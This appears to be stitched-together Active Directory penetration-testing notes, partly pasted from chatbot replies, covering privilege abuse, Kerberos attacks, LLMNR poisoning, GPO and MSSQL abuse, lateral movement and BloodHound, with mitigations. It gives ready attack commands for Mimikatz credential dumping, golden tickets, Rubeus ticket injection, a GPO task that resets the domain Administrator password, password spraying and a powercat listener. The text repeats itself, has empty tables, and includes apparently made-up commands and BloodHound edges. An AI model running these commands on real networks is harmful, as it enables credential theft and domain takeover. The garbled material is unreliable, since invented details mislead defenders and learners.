- RETURN p

- **Tools & Commands:**

  - PowerSploit:

  - Invoke-UserHunter -ForcePasswordReset

  - Native:

  - Set-ADAccountPassword -Identity \<user\> -Reset -NewPassword
    (ConvertTo-SecureString "NewPass123" -AsPlainText -Force)

- **Mitigation:** Monitor and restrict who can set this flag.

------------------------------------------------------------------------

**5. GenericWrite**

- **Description:** Grants ability to write to any attribute of a target
  AD object, bypassing attribute-level security.

- **Use in Attack:** Enables modification of user or group attributes
  for persistence or privilege escalation.

- **BloodHound Query:**

- MATCH
  p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanGenericWrite\]-\>()

- RETURN p

- **Tools & Commands:**

  - SharpHound / BloodHound:

  - Invoke-BloodHound -CollectionMethod All

  - Modify AD Object:

  - Set-ADObject -Identity \<objectDN\> -Add @{attribute="value"}

- **Mitigation:** Limit GenericWrite rights to trusted accounts.

------------------------------------------------------------------------

**6. SeTakeOwnershipPrivilege**

- **Description:** Allows taking ownership of files and directories.

- **Use in Attack:** Gain control over sensitive files for privilege
  escalation or persistence.

- **BloodHound Query:**

- MATCH
  p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanTakeOwnership\]-\>()

- RETURN p

- **Tools & Commands:**

  - PowerSploit:

  - Invoke-TakeOwn -Path "C:\SensitiveFolder"

- **Mitigation:** Restrict this privilege to system administrators only.

------------------------------------------------------------------------

**7. SeDebugPrivilege**

- **Description:** Allows debugging of processes and reading their
  memory.

- **Use in Attack:** Can enable code execution or bypass User Account
  Control (UAC).

- **BloodHound Query:**

- MATCH p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanDebug\]-\>()

- RETURN p

- **Tools & Commands:**

  - Metasploit:\
    exploit/windows/local/bypassuac_eventvwr

- **Mitigation:** Restrict to trusted administrators and monitor usage.

------------------------------------------------------------------------

**8. SeAssignPrimaryTokenPrivilege**

- **Description:** Allows assigning primary tokens to processes.

- **Use in Attack:** Token manipulation for privilege escalation.

- **BloodHound Query:**

- MATCH
  p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanAssignPrimaryToken\]-\>()

- RETURN p

- **Tools & Commands:**

  - Covenant:

  - Invoke-TokenManipulation -AssignPrimaryToken

- **Mitigation:** Limit to trusted processes and accounts.

------------------------------------------------------------------------

**9. SeIncreaseQuotaPrivilege**

- **Description:** Allows adjusting memory quotas for processes.

- **Use in Attack:** Can evade restrictions and assist privilege
  escalation.

- **BloodHound Query:**

- MATCH
  p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanIncreaseQuota\]-\>()

- RETURN p

- **Tools & Commands:**

  - Cobalt Strike:\
    privilege::debug

- **Mitigation:** Restrict to trusted processes.

------------------------------------------------------------------------

**10. SeChangeNotifyPrivilege**

- **Description:** Allows receiving notifications about file or
  directory changes.

- **Use in Attack:** Monitor sensitive file changes for reconnaissance
  or data leakage.

- **BloodHound Query:**

- MATCH
  p=(:User)-\[:MemberOf\*1..\]-\>(:Group)-\[:CanChangeNotify\]-\>()

- RETURN p

- **Tools & Commands:**

  - Empire Framework

- **Mitigation:** Limit to necessary accounts and monitor activity.

------------------------------------------------------------------------

**Summary**

- **Key weaknesses:** Over-privileged accounts with powerful rights like
  SeImpersonatePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege
  pose high risk.

- **Common tools:** Impacket (atexec.py), PowerSploit, Covenant,
  Metasploit, BloodHound/SharpHound.

- **Steps for pentesting:**

  1.  Enumerate privileges using BloodHound Cypher queries.

  2.  Exploit privileges to escalate rights or impersonate users.

  3.  Move laterally using token manipulation and command execution
      tools.

  4.  Persist by modifying AD attributes or taking ownership.

  5.  Clean up or maintain access stealthily.

- **Mitigation focus:** Limit and monitor powerful privileges, enforce
  least privilege, and audit token usage and privilege assignments.

Great question!

------------------------------------------------------------------------

**Mapping Windows Privileges (Se\*) to Attack Stages in AD Compromise**

------------------------------------------------------------------------

**Summary by Attack Stage:**

**1. Discovery**

- **SeChangeNotifyPrivilege** (default user privilege, helps traverse
  directories during enumeration)

- **SeSyncAgentPrivilege** (LDAP replication rights, allows stealthy AD
  data harvesting)

**2. Credential Access**

- **SeBackupPrivilege** (read system and backup files to extract
  credentials)

- **SeSyncAgentPrivilege** (read all directory objects, including
  secrets)

**3. Privilege Escalation**

- **SeAssignPrimaryTokenPrivilege** (token manipulation to escalate
  privileges)

**4. Lateral Movement**

- **SeAssignPrimaryTokenPrivilege** (impersonate tokens for moving
  laterally)

- **SeChangeNotifyPrivilege** (bypass directory traversal for access)

- **SeSyncAgentPrivilege** (replicate directory data from other
  domains/hosts)

**5. Defense Evasion**

- **SeAuditPrivilege** (generate or fake audit events)

- **SeSecurityPrivilege** (access and clear security event logs)

**6. Impact**

- **SeShutdownPrivilege** (shutdown or reboot target systems)

- **SeCreatePagefilePrivilege** (rare, but may aid in system
  manipulation)

- **SeAuditPrivilege** (create audit noise or hide tracks)

------------------------------------------------------------------------

**Example in Context:**

- An attacker who gains **SeSyncAgentPrivilege** can stealthily
  replicate AD database info, giving almost full read access without
  alerting admins.

- Obtaining **SeBackupPrivilege** allows dumping hashes or sensitive
  files for offline cracking.

- Using **SeAssignPrimaryTokenPrivilege** the attacker can escalate
  privileges or impersonate users/processes to move laterally.

- Clearing event logs using **SeSecurityPrivilege** helps evade
  detection after compromise.

------------------------------------------------------------------------

**Conclusion:**

These privileges are **leveraged mostly during the middle to later
stages of an Active Directory attack**, specifically:

- **Discovery**

- **Credential Access**

- **Privilege Escalation**

- **Defense Evasion**

- **Lateral Movement**

- **Impact (optional / target-dependent)**

They are **not typically initial access vectors**, but they
significantly empower the attacker post-initial foothold.

------------------------------------------------------------------------

If you want, I can help with the exact Windows commands or tools to
check these privileges, or how attackers abuse these in AD attacks
(e.g., Mimikatz, Rubeus, SharpHound). Just ask!

Here’s the mapping of those Windows privileges
(SeSystemEnvironmentPrivilege, SeDebugPrivilege, etc.) to **typical
attack stages used to compromise Active Directory** environments.

------------------------------------------------------------------------

------------------------------------------------------------------------

------------------------------------------------------------------------

**Explanation of Some Key Privileges:**

- **SeDebugPrivilege** is a *cornerstone privilege* in AD attacks for
  accessing all processes and stealing credentials or injecting code —
  used across **Credential Access, Privilege Escalation, and Lateral
  Movement**.

- **SeImpersonatePrivilege** and **SeCreateTokenPrivilege** enable
  *stealthy lateral movement* by allowing attackers to impersonate
  tokens or create new ones, critical for expanding control in AD.

- **SeEnableDelegationPrivilege** enables abuse of Kerberos delegation,
  a powerful escalation vector within AD.

- **SeLoadDriverPrivilege** enables kernel-mode malware or rootkits,
  often for persistence or impact.

- **SeRelabelPrivilege** can be used to *raise integrity levels* on
  objects, facilitating privilege escalation or defense evasion.

------------------------------------------------------------------------

**In a typical AD compromise, these privileges become relevant *after
initial access*, during:**

- **Privilege escalation** (getting SYSTEM or Domain Admin)

- **Lateral movement** (impersonating other users/processes)

- **Persistence** (establishing deeper footholds via kernel or system
  objects)

- **Defense evasion** (hiding malicious activity)

------------------------------------------------------------------------

If you want, I can also provide:

- Windows commands or tools to query these privileges

- Examples of how tools like Mimikatz or Cobalt Strike abuse them

- Mapping to MITRE ATT&CK IDs for precise reference

Just let me know!

Here’s the breakdown of the **Windows privileges you listed** and at
**what attack stage(s)** they are typically used during Active Directory
(AD) compromises:

------------------------------------------------------------------------

------------------------------------------------------------------------

------------------------------------------------------------------------

**Key Notes:**

- **SeMachineAccountPrivilege** is important for persistence and lateral
  movement because attackers can add new computers to the domain, often
  as stealthy backdoors or jump hosts.

- **SeTcbPrivilege** (“Act as part of the operating system”) is one of
  the most powerful privileges and is critical for deep compromise: it
  enables token creation, impersonation, and total system control.

- **SeRestorePrivilege** lets attackers overwrite critical files, often
  used to cover tracks or restore malicious versions of files to
  maintain persistence.

- **SeTrustedCredManAccessPrivilege** allows stealing credentials from
  Credential Manager, a direct **Credential Access** vector.

- Changing time or timezone (SeSystemtimePrivilege, SeTimeZonePrivilege)
  is a classic defense evasion technique to confuse forensic timelines.

- **SeRemoteShutdownPrivilege** is mostly used in the **Impact** stage
  for disruption.

**Privilege Escalation**

- sAMAccountName spoofing (CVE-2021-42287/42278)

- Abusing Active Directory Certificate Services (AD CS)

- PetitPotam NTLM relay attack

- Zerologon exploit (CVE-2020-1472)

- Group Policy Preferences passwords extraction

- MS14-068 Kerberos vulnerability exploitation

- DNSAdmins abuse

- Kerberos delegation attacks (unconstrained, constrained,
  resource-based)

- GPO permissions abuse

- ACL abuse with BloodHound and PowerView

- Domain Trust exploitation

- DCShadow for stealthy privilege escalation

- Microsoft SQL Server privilege escalation

- Exchange abuse for DA rights

Initial Privilege Escalation (Local)

- **Module 1 (continued)**

  - Local privilege escalation on Windows

  - Pivoting and bypassing AV

🔸 **Relevant Techniques:**

- UAC bypass

- Token impersonation

- DLL hijacking

- Unquoted service path exploitation

## Countermeasures

- **Limit AD admin membership (DA, EA, Schema Admins, etc.) and use
  tiered administration**

  - Reduces the impact and exposure of credential theft.

- **Disable inactive admin accounts and remove from privileged groups**

  - Prevents attackers from using dormant, forgotten privileged
    accounts.

- **Validate scheduled tasks & scripts**

  - Detect malicious persistence or privilege escalation scripts.

- **Apply security patches before running DCPromo (for DCs)**

  - Prevents exploits like MS14-068 (Kerberos vulnerability that allows
    privilege escalation).

- **Use time-based, temporary group membership for admin accounts**

  - Limits the window attackers can exploit stolen admin credentials.

- **Implement Fine-Grained Password Policies (FGPP)**

  - Raises password complexity and age requirements to hinder password
    cracking attacks.

## LLMNR Poisoning

- **Description:** Exploits Link-Local Multicast Name Resolution (LLMNR)
  and NetBIOS Name Service (NBT-NS) protocols to intercept and spoof
  name resolution requests on the local network, capturing credentials.

- **Tools:**

  - nmap -Pn -n -p 139,445 --script smb-enum-shares.nse \<IP\>

  - Responder

  - smbclient

- **Mitigation:** Disable LLMNR via Group Policy:\
  *Local Computer Policy → Computer Configuration → Administrative
  Templates → Network → DNS Client → Turn off multicast name
  resolution.*

LLMNR Poisoning or Link-Local Multicast Name Resolution Poisoning is a
very commonly used attack when it comes to running a penetration test
against a local network. LLMNR and NBT-NS (NetBIOS Name Service) attacks
go hand-in-hand as they can be performed by the same tool. The
Link-Local Multicast Name Resolution protocol itself is based on DNS and
allows hosts to resolve other hostnames on the same local link.

**Tools used:**

- 1.nmap -Pn -n -p 139,445 --script smb-enum-shares.nse 10.10.10.10

- 2.responder

- 3.smbclient //10.10.10.10/share

**Solutions**

LLMNR can be turned-o through the group policy editor, under the “policy
setting” menu under Local Computer Policy -\> Computer Configuration -\>
Administrative Templates -\> Network -\> DNS Client.

## AS-REP Roasting

- **Description:** Targets user accounts that do not require Kerberos
  pre-authentication by requesting AS-REP responses and brute-forcing
  the encrypted hashes offline.

- **Tools:**

  - Rubeus.exe asreproast

  - John the Ripper

- **Mitigation:** Identify and disable accounts set to “Do not require
  Kerberos pre-authentication.”

AS-REP Roasting is an attack against Kerberos for user accounts that do
not require pre-authentication. Pre-authentication is the first step in
Kerberos authentication, and is designed to prevent brute-force password
guessing attacks

**Tools:**

- 1.Rebeus.exe asreproast

- 2.John

**Solution:**

The obvious protections from this type of attack are to find and remove
any instances of user accounts that are set to not require Kerberos
pre-authentication

## ForceChange Password & GenericWrite Abuse

- **Description:** If an attacker has Extended Rights (such as
  User-ForceChange-Password), they can reset a user’s password without
  knowing the current one.

- **Tools:**

  - PowerView (.\PowerView.ps1)

  - Set-DomainUserPassword PowerShell cmdlet

- **Mitigation:** Regularly audit Active Directory delegations and group
  permissions, especially nested groups.

ForceChange Password

If we have ExtendedRight on User-ForceChange-Password object type, we
can reset the user’s password without knowing their current password

**Tools:**

- 1.. .\PowerView.ps1

- 2.Set-DomainUserPassword - Identity User -Verbose

**Solutions:**

It is recommended to do regular audits to check the delegations and
group permissions in nested groups.

GenericWrite

If we have ExtendedRight on User-ForceChange-Password object type, we
can reset the user’s password without knowing their current password

**Tools**:

1.. .\PowerView.ps1 2.Set-DomainUserPassword - Identity User -Verbose

**Solutions**:

It is recommended to do regular audits to check the delegations and
group permissions in nested groups

## Password Spraying

- **Description:** Attempts common passwords across many accounts to
  gain access without triggering account lockout.

- **Tools:**

  - CrackMapExec (crackmapexec winrm \<IPs\> -u users -p pass)

- **Mitigation:** Disable unnecessary authentication services (e.g.,
  WinRM), restrict remote desktop access, and enforce strong password
  policies.

**Password Spraying**

Able to get access to the internal network host using the credentials

**Tools:** 1.crackmapexec winrm ips -u users -p pass

**Solutions**:

Disable unwanted authentication services like WinRM and also restrict
unauthorized remote desktop connection with the private instances

## RunForPrivilegeEsc.exe Exploit

- **Description:** Abuse insecure executables running with SYSTEM
  privileges to escalate access.

- **Tools:**

  - dnSpy (for reverse engineering)

- **Mitigation:** Avoid deploying insecure applications with high
  privileges.

RunForPrivilege Esc.exe

There was a uncommon executable running as SYSTEM on the machine which
was then reversed and analysed and manipulated for our benefits

**Tools:** 1.dnSpy

**Solution**: Avoid using insecurely coded applications with high
privileges

## Pass the Ticket Attack

Pass-the-Ticket attacks take aim at Kerberos much in the same way as
Golden Ticket and Silver Ticket attacks, both of which exploit unfixable
weaknesses in the authentication protocol.

**Tools:** 1..\Rubeus.exe asktgt /user: \$ /rc4: /ptt 2.klist

**Solution**: Upon detecting a Pass-the-Ticket attack, your response
depends on the level of access the attack provided. If the compromised
account from which the TGT or service ticket was stolen was a low
privilege account with limited or no permissions outside of the
compromised system, mitigation could be as simple as resetting the
user’s Active Directory password. That would invalidate the stolen TGT
or service tickets and prevent the attacker from generating new tickets
using the stolen password hash

Pass-the-Ticket (PtT) Attack

- **Description:** Uses stolen Kerberos tickets (TGT or service tickets)
  to authenticate without passwords.

- **Tools:**

  - Rubeus.exe asktgt /user:\<user\> /rc4:\<hash\> /ptt

  - klist

- **Mitigation:** Upon detection, reset the compromised user’s password
  to invalidate stolen tickets. Limit privileges of accounts to minimize
  impact.

## Abusing Vulnerable GPO

Group Policies are part of every Active Directory. GP is designed to be
able to change every system’s configuration, from list to most
privileged layer. Since it is so fundamental in the network management
process, it is also very powerful for attackers to use as an attack
vector

**Tools**: 1..\SharpGPOAbuse.exe --AddComputerTask -- Taskname "Update"
--Author DOMAIN\\ - -Command "cmd.exe" --Arguments "/c net user
Administrator Password!@# /domain" -- GPOName "ADDITIONAL DC
CONFIGURATION"

**Solutions:**

Attackers use network mapping techniques as the first step of their
attack, but this same technique can be also used for mitigation. You
must know and reassess who has access to your GPOs. Using free tools,
such as BloodHound, can help you understand who has access to a GPO and
who inherits and access. It will help you spot potential lateral
movement paths and reevaluate if your current state is answering a “list
privileges” method

Abusing Vulnerable Group Policy Objects (GPOs)

- **Description:** Attackers leverage GPOs to execute commands or change
  configurations across multiple systems.

- **Tools:**

  - SharpGPOAbuse.exe

- **Mitigation:** Use tools like BloodHound to audit and monitor GPO
  access, restrict delegation, and review inheritance to close lateral
  movement paths.

## Abusing MSSQL Service Databases

- **Description:** MS SQL Server integrated with AD can be abused via
  trusted database settings or elevated privileges.

- **Tools:**

  - PowerUpSQL (PowerUpSQL.ps1)

  - SQL Server instance enumeration and query tools

  - PowerCat (powercat.ps1) for reverse shells

- **Mitigation:** Keep the TRUSTWORTHY database setting **OFF** to
  reduce attack surface. Regularly audit SQL Server permissions.

Abusing MSSQL Service Database

MS SQL Server is widely used in enterprise networks. Due to its use by
third party applications, support for legacy applications and use as a
database, SQL Server is a treasure trove for attackers. It gets
integrated with in an active directory environment very well, which
makes it an attractive target for abuse of features and privileges.

**Tools**:

1.PowerUPSQL.ps1 2.Get-SQLInstanceLocal -Verbose
3.(Get-SQLServerLinkCrawl -Verbose -Instance "10.10.10.20" -Query
'select \* from master..sysservers').customquery Import-Module
.\powercat.ps1 powercat -l -v -p 443 -t 10000

**Solution:**

You can use the TRUSTWORTHY database setting to indicate whether the
instance of Microso SQL Server trusts the database and the contents
within the database. By default, this setting is set to OFF. However,
you can set it to ON by using the ALTER DATABASE statement. I recommend
that you leave this setting set to OFF to mitigate certain threats that
may be present when a database is attached to the server

## Abusing Domain Trusts

- **Description:** Trust relationships allow authentication referrals
  across domains, which attackers can abuse to escalate privileges or
  access resources in trusted domains.

- **Tools:**

  - Mimikatz (lsadump::dcsync, kerberos::golden)

- **Mitigation:**

  - Remove local admin rights from low-privileged users.

  - Disable or restrict WinRM service.

  - Use separate accounts and permissions for critical enclave WinRM
    access.

Abusing Domain Trusts

At a high level, a domain trust establishes the ability for users in one
domain to authenticate to resources or act as a security principal in
another domain, a trust does is link up the authentication systems of
two domains and allows authentication tra ic to flow between them
through a system of referrals. If a user requests access to a service
principal name (SPN) of a resource that resides outside of the domain
they’re current in, their domain controller will return a special
referral ticket that points to the key distribution center (KDC, in the
Windows case the domain controller) of the foreign domain.

**Tools:**

1.mimikatz \# lsadump::dcsync /user:

2.mimikatz \# kerberos::golden /user: /domain: /sid:

**Solution:**

Remove local admin rights from low privileged users in the domain,
disable winrm service if not required and if the service is necessary,
lock down critical enclaves with separate WinRM accounts and permissions

Privilege Escalation Countermeasures

This document outlines common Active Directory privilege escalation
issues, their associated actions/tools, and potential solutions. Here's
a summarized and corrected version:

**Issue:** Abusing Domain Trusts

- **Description:** Exploiting trust relationships between domains to
  gain access to resources in another domain. Attackers can use referral
  tickets to target the KDC of the foreign domain.

- **Actions/Tools:** (Not explicitly mentioned, but likely involves
  tools for manipulating trust relationships and Kerberos tickets)

- **Solution:** Restrict local administrator rights for low-privileged
  users, disable WinRM (Windows Remote Management) if unnecessary, and
  if WinRM is required, secure critical systems with dedicated WinRM
  accounts and strict permissions.

**Issue:** Abusing MSSQL Service Database

- **Description:** Exploiting vulnerabilities in MSSQL Server, often due
  to its integration with Active Directory and use by various
  applications.

- **Actions/Tools:** PowerUPSQL.ps1

- **Solution:** Set the TRUSTWORTHY database setting to OFF. This helps
  mitigate risks associated with attached databases.

**Issue:** Abusing Vulnerable GPO (Group Policy Object)

- **Description:** Compromising GPOs to modify system configurations and
  escalate privileges.

- **Actions/Tools:** SharpGPOAbuse.exe, BloodHound

- **Solution:** Regularly audit and reassess GPO permissions. Use tools
  like BloodHound to analyze access and identify potential attack paths.
  Implement the principle of least privilege for GPO management.

**Issue:** AS-REP Roasting

- **Description:** Exploiting Kerberos accounts that do not require
  pre-authentication to brute-force password hashes.

- **Actions/Tools:** (Not specified, but tools for Kerberos attacks)

- **Solution:** Enforce pre-authentication for all user accounts.

**Issue:** ForceChange Password

- **Description:** Resetting user passwords without knowing the current
  password by exploiting ExtendedRight permissions on the
  User-Force-Change-Password object.

- **Actions/Tools:** (Likely tools for manipulating Active Directory
  permissions)

- **Solution:** Restrict ExtendedRight permissions on the
  User-Force-Change-Password object to only authorized administrators.

**Issue:** GenericWrite

- **Description:** Similar to ForceChange Password, exploiting
  ExtendedRight permissions to reset user passwords.

- **Actions/Tools:** (Likely tools for manipulating Active Directory
  permissions)

- **Solution:** Restrict ExtendedRight permissions on sensitive Active
  Directory objects. Regularly audit these permissions.

**Issue:** LLMNR Poisoning (Link-Local Multicast Name Resolution)

- **Description:** Tricking systems into resolving hostnames to
  attacker-controlled IP addresses. Often used in conjunction with
  NBT-NS poisoning.

- **Actions/Tools:** Tools designed for LLMNR and NBT-NS poisoning
  (e.g., Responder)

- **Solution:** Disable LLMNR and NBT-NS if not required. Implement
  proper network segmentation and firewall rules.

**Issue:** Pass the Ticket Attack

- **Description:** Stealing Kerberos tickets (TGTs or service tickets)
  to impersonate users.

- **Actions/Tools:** (Tools for Kerberos attacks)

- **Solution:** Reset the password of the compromised account. Implement
  strong password policies and multi-factor authentication. Monitor for
  suspicious Kerberos activity.

**Issue:** Password Spraying

- **Description:** Attempting to log in to multiple accounts with a
  small number of commonly used passwords.

- **Actions/Tools:** (Tools for password spraying)

- **Solution:** Implement account lockout policies, multi-factor
  authentication, and password complexity requirements. Monitor for
  suspicious login attempts.

**Issue:** RunForPrivilege Esc.exe

- **Description:** Exploiting a vulnerable executable running with
  SYSTEM privileges.

- **Actions/Tools:** dnSpy (for reverse engineering)

- **Solution:** (The solution depends on the specific vulnerability.
  Generally, involves patching the vulnerable software or removing the
  executable.) Regularly patch systems and applications.

**General Recommendations:**

- **Principle of Least Privilege:** Grant users and services only the
  necessary permissions.

- **Regular Audits:** Regularly audit Active Directory permissions,
  GPOs, and other security settings.

- **Monitoring:** Monitor for suspicious activity and security events.

- **Patching:** Keep all systems and software up to date with the latest
  patches.

- **Security Awareness Training:** Educate users about security best
  practices.

## Credential Access & Privilege Escalation Techniques

| **Technique** | **Stage in Attack Chain** | **Description** |
|----|----|----|
| **DC Backdoor (Skeleton Key)** | Persistence | Injects a master password into LSASS on DC; attacker can log in as any user. |
| **Dumping Domain Hashes** | Credential Access | Extract NTLM/Kerberos hashes from memory or database (e.g., using Mimikatz). |
| **ForceChange Password** | Privilege Escalation | Abuse of rights to reset passwords without knowledge of current ones. |
| **GenericWrite** | Privilege Escalation | Abuse of AD ACL to overwrite sensitive attributes on objects (e.g., reset passwords, add rights). |
| **Password Spraying** | Initial Access / Credential Access | Attempt to authenticate multiple accounts with a common password. |

## Domain Privilege Escalation

- **Module 2 (continued)**

  - Kerberoasting

  - Delegation abuse (Unconstrained, Constrained, Resource-Based)

  - AdminSDHolder exploitation

  - Skeleton key & custom SSP

🔸 **Relevant Techniques:**

- Kerberoast → crackable TGS service tickets

- Abuse msDS-AllowedToDelegateTo

- Modify ACLs to gain GenericAll over privileged objects

**Step 3: Abuse SeDebugPrivilege to Extract Credentials**

Using Mimikatz on a compromised host with debug rights:

privilege::debug

sekurlsa::logonpasswords

**Step 4: Impersonate Tokens (SeImpersonatePrivilege)**

Use Mimikatz or PowerShell to impersonate tokens:

Invoke-TokenManipulation -ImpersonateUser Administrator

**Step 5: Use SeBackupPrivilege to Copy Sensitive Files**

wbadmin start backup -backuptarget:D: -include:C: -quiet

Or robocopy with backup mode:

robocopy C:\SensitiveFolder D:\BackupFolder /B /E

# Lateral Movement

- **Segment network to protect admin and critical systems**

  - Limits lateral movement opportunities.

- **Deploy IDS to monitor internal network traffic**

  - Detects suspicious lateral movement activity.

- **Only run necessary services on DCs and limit DC admin/logon rights**

  - Reduces attack vectors for lateral movement into DCs.

- **Ensure all domain authentications use NTLMv2 only, refuse LM &
  NTLM**

  - Mitigates Pass-the-Hash (PtH) and NTLM relay attacks used in lateral
    movement.

- **Use SMB v2/v3+ and patch SMB vulnerabilities (e.g., CVE-2017-0143
  EternalBlue)**

  - Prevents remote code execution and lateral movement via SMB
    exploits.

## 4. Lateral Movement

- Pass-the-Hash attacks

- Using SCCM for remote code execution

- WSUS exploitation for weaponization

- Password spraying

- Automated lateral movement tools like GoFetch, DeathStar, ANGRYPUPPY

- NTLM relaying and Kerberos delegation chaining

- SQL Server linked server exploitation

## Lateral Movement

Here's a **corrected and summarized** version of the provided content
tailored for **Windows and Active Directory Penetration Testing**,
focusing specifically on **Lateral Movement Enumeration and
Exploitation** using PowerView and other AD tools.

------------------------------------------------------------------------

**🎯 Lateral Movement in Windows & Active Directory Pentesting**

------------------------------------------------------------------------

**🔍 Overview**

| **Category** | **Details** |
|----|----|
| **Tactics Used** | Lateral Movement, Credential Access, Discovery |
| **MITRE ATT&CK** | T1075 (Pass the Hash), T1021.001 (PowerShell Remoting), T1087 (Account Discovery) |
| **Tools Used** | PowerView, PowerSploit, AD Module, Custom Scripts |
| **Vulnerabilities Abused** | Misconfigured ACLs, Unconstrained/Constrained Delegation, SPNs, Weak Passwords |
| **Security Risk Severity** | **Critical** – enables attacker to move across systems and escalate privileges |
| **Impact on Workload** | High – attacker gains access to new systems, accounts, and can compromise domain |

------------------------------------------------------------------------

**🧪 Steps & Commands to Perform Lateral Movement Enumeration**

------------------------------------------------------------------------

**🔹 1. Identify Local Admin Access (noisy methods)**

\# Enumerate systems where current user has local admin rights
(generates traffic)

Find-LocalAdminAccess

------------------------------------------------------------------------

**🔹 2. PS Remoting-Based Admin Access**

\# Get list of all domain computers

Get-NetComputer -Domain yourdomain.local \> .\targets.txt

\# Test PS Remoting access (must have PowerShell remoting enabled on
target)

Find-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt

------------------------------------------------------------------------

**🔹 3. WMI-Based Lateral Access Discovery**

\# Requires additional script: Find-WMILocalAdminAccess.ps1

Find-WMILocalAdminAccess -ComputerFile .\targets.txt

🔍 WMI is stealthier than PS Remoting but still detectable by EDR if
monitored.

------------------------------------------------------------------------

**🔹 4. Hunt for Active Sessions of Privileged Users**

\# Identify where high-value users (e.g., Domain Admins) are logged in
and if attacker has access

Invoke-UserHunter -CheckAccess \| ?{ \$\_.LocalAdmin -eq \$True }

------------------------------------------------------------------------

**🔐 Credential Theft Opportunities**

------------------------------------------------------------------------

**🔹 5. Kerberoasting Candidates**

\# Find users with Service Principal Names (SPNs) set

Get-DomainUser -SPN \| select name, serviceprincipalname

These accounts can have service tickets requested and cracked offline
(Kerberoasting).

------------------------------------------------------------------------

**🔹 6. AS-REP Roasting Candidates**

\# Identify accounts without Kerberos pre-authentication

Get-DomainUser -PreauthNotRequired \| select name

These accounts are vulnerable to offline brute force attacks via AS-REP
roasting.

------------------------------------------------------------------------

**🧬 Delegation Attacks**

------------------------------------------------------------------------

**🔹 7. Check for Unconstrained Delegation**

\# Systems that store TGTs of users – compromise = full impersonation

Get-DomainComputer -Unconstrained

🛑 **High-Risk:** If you have admin access on one, dump memory and
extract TGTs.

------------------------------------------------------------------------

**🔹 8. Check for Constrained Delegation**

\# Look for users and computers configured for S4U (Service-for-User)

Get-DomainUser -TrustedToAuth \| select userprincipalname

Get-DomainComputer -TrustedToAuth \| select name,
msds-allowedtodelegateto

🎯 Combine with hash/token access for S4U2Self → S4U2Proxy abuse.

------------------------------------------------------------------------

**⚙️ Advanced ACL Enumeration**

------------------------------------------------------------------------

**🔹 9. Identify Misconfigured ACLs (Object Control)**

\# Check where user/computer has privilege to modify AD objects (e.g.,
disable preauth or set SPN)

Invoke-ACLScanner -ResolveGUIDs \| ?{ \$\_.IdentityReference -like
"\*YourUsername\*" }

🛠️ Modify vulnerable users to be AS-REP roastable or kerberoastable.

------------------------------------------------------------------------

**🔒 Detection and Mitigation Recommendations (Blue Team)**

| **Control** | **Mitigation** |
|----|----|
| PowerShell Logging | Enable transcription and script block logging |
| Remote Admin Access | Restrict use of local admin rights across systems |
| Delegation Config | Disable Unconstrained Delegation and audit Constrained Delegation usage |
| ACL Auditing | Use tools like PingCastle or BloodHound to audit permissions and ACL paths |
| Credential Protection | Enforce LAPS, LSASS protection, and monitor ticket usage |

------------------------------------------------------------------------

**📊 Impact Summary**

| **Technique** | **Severity** | **Impact** |
|----|----|----|
| Local Admin Enumeration | Medium | Identifies lateral movement targets |
| PS/WMI Access Discovery | High | Identifies direct command execution paths |
| UserHunter | High | Targets privileged user sessions for credential theft |
| Kerberoast/AS-REP Roast | Critical | Enables offline password cracking of service accounts |
| Delegation Abuse | Critical | Grants full impersonation of users including Domain Admins |

------------------------------------------------------------------------

Would you like me to map this into a **BloodHound abuse path**,
**automated script**, or provide a **stealth variant using
SharpView/C#** for red team use?

### Bloodhound

Here is a **corrected and structured summary** of using **BloodHound for
Lateral Movement Enumeration** in **Windows and Active Directory
Penetration Testing**, including tactics, techniques, tools,
vulnerabilities, risk, impact, and step-by-step commands.

------------------------------------------------------------------------

**🎯 Windows & Active Directory Pentesting: BloodHound for Lateral
Movement**

------------------------------------------------------------------------

**🛠️ Tactics, Techniques, and Strategies**

| **Category** | **Details** |
|----|----|
| **Tactics Used** | Lateral Movement, Privilege Escalation, Credential Access, Discovery |
| **MITRE ATT&CK** | T1482 (Domain Trust Discovery), T1087 (Account Discovery), T1069 (Permission Groups Discovery) |
| **Tools Used** | BloodHound, SharpHound.ps1, SharpHound.exe |
| **Vulnerabilities Abused** | Excessive privileges, misconfigured ACLs, unconstrained delegation, session exposure |
| **Security Risk** | **Critical** – Maps out paths to Domain Admin and other high-value targets |
| **Impact** | High – Attacker can enumerate all lateral movement and privilege escalation paths |

------------------------------------------------------------------------

**🔧 Tools and Setup**

- **BloodHound GUI**: Used for analysis and pathfinding.

- **SharpHound**: Data collection tool, available as:

  - SharpHound.exe (compiled binary)

  - SharpHound.ps1 (PowerShell script for reflective, fileless
    execution)

------------------------------------------------------------------------

**📜 Steps and Commands to Perform the Assessment**

**🔹 1. Use PowerShell Version of SharpHound (OpSec-sensitive
environments)**

\# Import SharpHound.ps1 (assuming it's already downloaded or hosted)

Import-Module .\SharpHound.ps1

\# Run full collection (very noisy, not recommended for stealth
operations)

Invoke-BloodHound -CollectionMethod All

\# Stealthier: Run only session data collection (e.g., who is logged in
where)

Invoke-BloodHound -CollectionMethod LoggedOn

\# You can also use other collection methods selectively:

\# - Session

\# - Trusts

\# - ACL

\# - RDP

\# - Group Membership

**🔹 2. Use SharpHound.exe (binary execution)**

\# Collect all data (recommended in lab or loud environments)

SharpHound.exe -c All

\# Collect only logged-on sessions

SharpHound.exe -c LoggedOn

\# Output is ZIP or JSON files (by default in the current directory)

------------------------------------------------------------------------

**🔹 3. Transfer Collected Data to BloodHound GUI**

- Use the BloodHound GUI client

- Drag and drop the collected .zip or .json files into the GUI for
  analysis

------------------------------------------------------------------------

**🔍 What BloodHound Helps You Identify**

| **Objective** | **Description** |
|----|----|
| **Shortest path to DA** | Shows minimal steps required to become Domain Admin |
| **Session hijacking targets** | Identifies where privileged users are logged in |
| **Delegation abuse paths** | Unconstrained and constrained delegation paths for impersonation |
| **ACL-based attacks** | Users/groups with GenericAll, WriteDACL, or other modifiable permissions |
| **RDP/SMB access paths** | Where the user has remote logon rights |

------------------------------------------------------------------------

**🔒 Detection & Mitigation Tips**

| **Control** | **Recommendation** |
|----|----|
| PowerShell Logging | Enable Script Block and Module logging |
